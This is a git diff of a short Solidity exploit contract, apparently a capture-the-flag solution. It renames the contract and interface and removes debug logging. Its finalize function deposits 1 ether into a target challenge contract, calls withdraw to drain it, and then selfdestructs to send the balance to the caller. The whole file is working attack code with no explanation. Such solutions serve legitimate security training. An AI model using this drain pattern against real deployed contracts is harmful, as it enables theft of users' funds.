@@ -1,24 +1,22 @@
+// SPDX-License-Identifier: None
 pragma solidity 0.8.11;
 
-import "hardhat/console.sol";
-
-interface Exploit38_Challenge {
+interface IChallenge_sidduHERE {
     function deposit() external payable;
 
     function withdraw() external;
 }
 
-contract Exploit38 {
-    Exploit38_Challenge instance;
+contract Exploit_sidduHERE {
+    IChallenge_sidduHERE instance;
 
-    constructor(Exploit38_Challenge _instance) {
+    constructor(IChallenge_sidduHERE _instance) {
         instance = _instance;
     }
 
     function finalize() external payable {
         instance.deposit{value: 1 ether}();
         instance.withdraw();
-        console.log(address(instance).balance);
 
         selfdestruct(payable(msg.sender));
     }
